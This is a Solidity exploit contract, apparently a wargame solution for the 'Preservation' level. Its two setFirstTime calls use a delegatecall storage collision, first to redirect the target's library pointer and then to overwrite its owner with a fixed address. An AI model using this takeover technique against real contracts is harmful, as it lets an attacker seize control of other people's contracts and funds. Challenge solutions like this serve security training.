// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "../instances/Ilevel16.sol";

contract DelegateHack {

    address public t1;
    address public t2;
    address public owner;
    Preservation level16 = Preservation(0x1E422B805DC5541a09fBbf239D734313B9F42Eca);      

    function exploit() external {
        level16.setFirstTime(uint256(address(this)));
        level16.setFirstTime(uint256(0xEAce4b71CA1A128e8B562561f46896D55B9B0246));
    }

    function setTime(address _owner) public {
        owner = _owner;
    }

}